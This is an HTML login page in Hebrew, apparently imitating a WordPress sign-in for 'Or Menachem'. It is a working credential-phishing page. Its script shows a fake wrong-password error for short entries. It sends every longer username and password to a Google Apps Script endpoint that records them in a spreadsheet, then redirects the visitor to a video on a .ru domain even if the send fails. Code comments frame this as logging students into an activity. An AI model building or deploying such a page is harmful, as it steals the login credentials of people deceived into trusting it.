<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>התחברות - אור מנחם</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #5d93bc; /* צבע הרקע הכחול המדויק מהתמונה */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .logo-container {
            margin-bottom: 25px;
            text-align: center;
        }

        .logo-container img {
            max-width: 280px;
            height: auto;
        }

        /* תיבת השגיאה המעוצבת בהשראת התמונה */
        .error-box {
            background-color: white;
            padding: 15px 20px;
            border-radius: 2px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            width: 420px;
            box-sizing: border-box;
            border-right: 4px solid #d32f2f; /* הפס האדום בצד ימין */
            margin-bottom: 15px;
            font-size: 15px;
            color: #222;
            line-height: 1.4;
            display: none; /* מוסתר כברירת מחדל */
        }

        .error-box strong {
            color: #d32f2f;
        }

        /* תיבת ההתחברות המרכזית */
        .login-box {
            background-color: white;
            padding: 35px 30px;
            border-radius: 2px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            width: 420px;
            box-sizing: border-box;
            border-bottom: 4px solid #7cb342; /* הפס הירוק בתחתית התיבה */
            transition: transform 0.1s ease;
        }

        /* הגדרת האנימציה של הרטט (ימינה ושמאלה) */
        @keyframes shake {
            0% { transform: translateX(0); }
            20% { transform: translateX(-10px); }
            40% { transform: translateX(10px); }
            60% { transform: translateX(-10px); }
            80% { transform: translateX(10px); }
            100% { transform: translateX(0); }
        }

        /* קלאס שיופעל דרך ה-JavaScript בזמן שגיאה */
        .shake-effect {
            animation: shake 0.4s ease-in-out;
        }

        .form-group {
            margin-bottom: 22px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 10px;
            color: #222;
            font-size: 16px;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #b0bec5;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
        }

        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #1565c0;
        }

        .password-container {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            left: 12px; /* מיקום העין בצד שמאל בתוך התיבה */
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #1565c0;
            font-size: 18px;
            user-select: none;
        }

        /* שורת הרכיבים התחתונה */
        .bottom-row {
            display: flex;
            justify-content: space-between; /* דוחף אחד לימין ואחד לשמאל */
            align-items: center;
            margin-top: 25px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 15px;
            font-weight: bold;
            color: #222;
            cursor: pointer;
            order: 1; /* מוודא שיהיה בצד ימין */
        }

        .remember-me input {
            cursor: pointer;
            width: 16px;
            height: 16px;
        }

        .btn-submit {
            background-color: #1565c0; /* צבע הכפתור הכחול */
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s;
            order: 2; /* מוודא שיהיה בצד שמאל */
        }

        .btn-submit:hover {
            background-color: #0d47a1;
        }

        .loading-message {
            color: #1565c0;
            font-weight: bold;
            margin-top: 15px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>

    <!-- אזור הלוגו -->
    <div class="logo-container">
        <img src="logo.png" alt="אור מנחם">
    </div>

    <!-- תיבת שגיאה דינמית (מופיעה מעל הריבוע הלבן) -->
    <div class="error-box" id="errorBox">
        <strong>שגיאה:</strong> הסיסמה שהוזנה עבור המשתמש <span id="wrongUser" style="font-weight: bold;"></span> אינה נכונה.
    </div>

    <!-- תיבת ההתחברות המרכזית -->
    <div class="login-box" id="loginBox">
        <form id="activityForm">
            
            <!-- שדה עליון: שם משתמש או כתובת אימייל -->
            <div class="form-group">
                <label for="studentName">שם משתמש או כתובת אימייל</label>
                <input type="text" id="studentName" name="studentName" required>
            </div>

            <!-- שדה תחתון: סיסמה עם עינית -->
            <div class="form-group">
                <label for="accessCode">סיסמה</label>
                <div class="password-container">
                    <input type="password" id="accessCode" name="accessCode" required>
                    <span class="toggle-password" id="eyeIcon">👁️</span>
                </div>
            </div>

            <div class="bottom-row">
                <!-- תיבת סימון "זכור אותי" (מימין) -->
                <label class="remember-me">
                    <input type="checkbox" id="rememberme" name="rememberme">
                    <span>זכור אותי</span>
                </label>

                <!-- כפתור התחבר (משמאל) -->
                <button type="submit" class="btn-submit" id="submitBtn">התחבר</button>
            </div>

            <div class="loading-message" id="loadingMsg">מתחבר ומעביר לפעילות...</div>
        </form>
    </div>

    <script>
        // כאן מדביקים את הקישור הארוך שקיבלת מה-Apps Script של גוגל שיטס
        const googleScriptUrl = "https://script.google.com/macros/s/AKfycbyfENOeiDb5MRcTYPwPk1rGQSchQYezyJ9hhGv8yB9aQFYH1JBvHN9OoVk9l-_w56kuMg/exec";

        // מנגנון העין לחשיפה והסתרת הקוד/סיסמה
        const togglePassword = document.getElementById('eyeIcon');
        const passwordInput = document.getElementById('accessCode');

        togglePassword.addEventListener('click', function () {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.style.opacity = type === 'password' ? '1' : '0.5';
        });

        // מנגנון בדיקה, אפקט רטט ורישום בשיטס
        document.getElementById('activityForm').addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            const nameInput = document.getElementById('studentName').value;
            const codeInput = document.getElementById('accessCode').value;
            
            const errorBox = document.getElementById('errorBox');
            const wrongUser = document.getElementById('wrongUser');
            const loginBox = document.getElementById('loginBox');
            const loadingMsg = document.getElementById('loadingMsg');
            const submitBtn = document.getElementById('submitBtn');
            
            // בדיקה: האם הקוד קצר מ-8 תווים?
            if (codeInput.length < 8) {
                // 1. עדכון שם המשתמש השגוי בתוך הודעת השגיאה והצגתה
                wrongUser.textContent = nameInput;
                errorBox.style.display = 'block';
                loadingMsg.style.display = 'none';
                
                // 2. הפעלת אפקט הרטט על תיבת ה-loginBox
                loginBox.classList.remove('shake-effect'); // איפוס האנימציה במידה וכבר קיימת
                void loginBox.offsetWidth; // טריק קטן ב-JS שמכריח את הדפדפן לרענן את ה-CSS של האלמנט
                loginBox.classList.add('shake-effect'); // הפעלה מחדש של הרטט
                
                return; // עוצר ולא ממשיך לשמירה בשיטס
            }
            
            // אם הקוד תקין (8 תווים ומעלה) - מסתירים שגיאות, מראים טעינה וחוסמים את הכפתור
            errorBox.style.display = 'none';
            loadingMsg.style.display = 'block';
            submitBtn.disabled = true;

            // שליחת נתוני שם המשתמש והקוד שהוקלד ל-Google Sheets שלכם
            const formData = new FormData();
            formData.append('studentName', nameInput);
            formData.append('accessCode', codeInput);

            fetch(googleScriptUrl, {
                method: 'POST',
                mode: 'no-cors',
                body: formData
            })
            .then(() => {
                // הרישום בשיטס עבר בהצלחה! מעבירים את התלמיד ישירות לווידאו המבוקש
                window.location.href = "https://or-menachem.ru/wp-content/uploads/2026/05/VIDEO-2025-09-17-23-10-38.mp4";
            })
            .catch(error => {
                console.error('Error:', error);
                // גם במקרה של שגיאת תקשורת זמנית בשמירה, נעביר את התלמיד כדי שהשיעור לא ייעצר
                window.location.href = "https://or-menachem.ru/wp-content/uploads/2026/05/VIDEO-2025-09-17-23-10-38.mp4";
            });
        });
    </script>

</body>
</html>
